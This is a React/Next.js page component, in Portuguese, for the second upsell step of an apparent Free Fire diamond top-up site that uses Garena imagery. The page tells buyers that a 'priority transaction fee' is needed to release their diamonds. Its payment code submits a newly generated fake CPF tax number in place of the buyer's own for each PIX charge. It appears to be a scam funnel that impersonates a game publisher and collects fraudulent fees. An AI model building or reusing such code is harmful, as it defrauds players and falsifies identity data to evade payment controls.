'use client';

import { useState } from 'react';
import { useRouter } from 'next/navigation';
import Image from 'next/image';
import { Button } from '@/components/ui/button';
import { Header } from '@/components/freefire/Header';
import { Footer } from '@/components/freefire/Footer';
import { cn } from '@/lib/utils';
import { taxOffer } from '@/lib/data';
import { useToast } from '@/hooks/use-toast';
import { CheckCircle } from 'lucide-react';
import { PaymentPayload } from '@/interfaces/types';
import { gerarCPFValido } from '@/lib/utils';

// Tipos para os dados do cliente
interface CustomerData {
    name: string;
    email: string;
    phone: string;
}

const Upsell2Page = () => {
    const router = useRouter();
    const { toast } = useToast();
    const [selectedOfferId] = useState<string | null>(taxOffer[0]?.id || null);
    const [isSubmitting, setIsSubmitting] = useState(false);

    const handleDecline = () => {
        // Limpa os dados do cliente se ele recusar a oferta final
        localStorage.removeItem('customerData');
        router.push('/success');
    };

    const handlePurchase = async () => {
        if (!selectedOfferId) {
            toast({
                variant: 'destructive',
                title: 'Erro',
                description: 'Nenhuma taxa selecionada.',
            });
            return;
        }

        setIsSubmitting(true);

        const selectedProduct = taxOffer.find(p => p.id === selectedOfferId);
        if (!selectedProduct) {
            setIsSubmitting(false);
            return;
        }
        
        const customerDataString = localStorage.getItem('customerData');
        const playerName = localStorage.getItem('playerName') || 'Desconhecido';
        
        if (!customerDataString) {
            toast({
                variant: "destructive",
                title: "Erro",
                description: "Dados do cliente não encontrados. Por favor, reinicie a compra.",
            });
            setIsSubmitting(false);
            router.push('/');
            return;
        }

        try {
            const customerData: CustomerData = JSON.parse(customerDataString);
            const utmQuery = new URLSearchParams(window.location.search).toString();
            const currentBaseUrl = window.location.origin;

            const payload: PaymentPayload = {
                name: customerData.name,
                email: customerData.email,
                phone: customerData.phone.replace(/\D/g, ''),
                cpf: gerarCPFValido().replace(/\D/g, ''), // Gera um novo CPF para a transação
                paymentMethod: "PIX",
                amount: parseFloat(selectedProduct.price),
                externalId: `ff-upsell2-${Date.now()}`,
                items: [{
                    id: selectedProduct.id,
                    title: selectedProduct.name,
                    unitPrice: parseFloat(selectedProduct.price),
                    quantity: 1,
                    tangible: false
                }],
                postbackUrl: `${currentBaseUrl}/api/ghostpay-webhook`,
                utmQuery,
                traceable: true,
            };

            const response = await fetch("/api/create-payment", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload),
            });

            const data = await response.json();

            if (!response.ok) {
                throw new Error(data.message || "Erro ao criar o pagamento para a taxa.");
            }

            // Salva os dados de pagamento da taxa
            localStorage.setItem('paymentData', JSON.stringify({
                ...data,
                playerName: playerName,
                productDescription: selectedProduct.name,
                amount: selectedProduct.formattedPrice,
                diamonds: selectedProduct.totalAmount,
                originalAmount: selectedProduct.originalAmount,
                bonusAmount: selectedProduct.bonusAmount,
                totalAmount: selectedProduct.totalAmount,
                productId: selectedProduct.id,
            }));
            
            // Limpa os dados do cliente pois este é o final do fluxo
            localStorage.removeItem('customerData');
            
            router.push('/buy');

        } catch (error: any) {
            toast({
                variant: "destructive",
                title: "Erro no Pagamento",
                description: error.message,
            });
            setIsSubmitting(false);
        }
    };

    return (
        <div className="flex flex-col min-h-screen bg-gray-50">
            <Header />
            <main className="flex-1 flex flex-col items-center justify-center p-4 text-center">
                <div className="bg-white rounded-2xl shadow-lg p-6 md:p-10 max-w-lg w-full border">
                    <CheckCircle className="h-16 w-16 text-green-500 mx-auto mb-4" />
                    <h1 className="text-2xl md:text-3xl font-bold text-gray-800 uppercase tracking-wider">
                        Liberação Imediata
                    </h1>
                    <p className="mt-3 text-base text-gray-600">
                        Para garantir a entrega imediata e segura dos seus diamantes, é necessário o pagamento de uma pequena taxa de transação prioritária.
                    </p>
                    
                    <div className="flex flex-col gap-4 my-8">
                        {taxOffer.map(offer => (
                            <div
                                key={offer.id}
                                className={cn(
                                    "p-4 rounded-lg border-2 cursor-default transition-all duration-200 text-left flex items-center gap-4",
                                    'border-destructive bg-destructive/5'
                                )}
                            >
                                <div className="flex-shrink-0">
                                    <Image src="https://cdn-gop.garenanow.com/gop/mshop/www/live/assets/ic-safety-919638c4.png" alt="Taxa" width={40} height={40} data-ai-hint="shield" />
                                </div>
                                <div>
                                    <h2 className="text-lg font-bold text-gray-800">{offer.name}</h2>
                                    <p className="text-2xl font-extrabold text-gray-900">{offer.formattedPrice}</p>
                                </div>
                            </div>
                        ))}
                    </div>

                    <div className="flex flex-col gap-3">
                        <Button
                            onClick={handlePurchase}
                            disabled={!selectedOfferId || isSubmitting}
                            className="w-full text-lg py-6 font-bold"
                            variant="destructive"
                        >
                            {isSubmitting ? 'Processando...' : 'Pagar Taxa e Liberar Diamantes'}
                        </Button>
                        <Button
                            onClick={handleDecline}
                            variant="link"
                            className="text-gray-500 hover:text-gray-700"
                        >
                            Não, obrigado.
                        </Button>
                    </div>
                </div>
            </main>
            <Footer />
        </div>
    );
};

export default Upsell2Page;
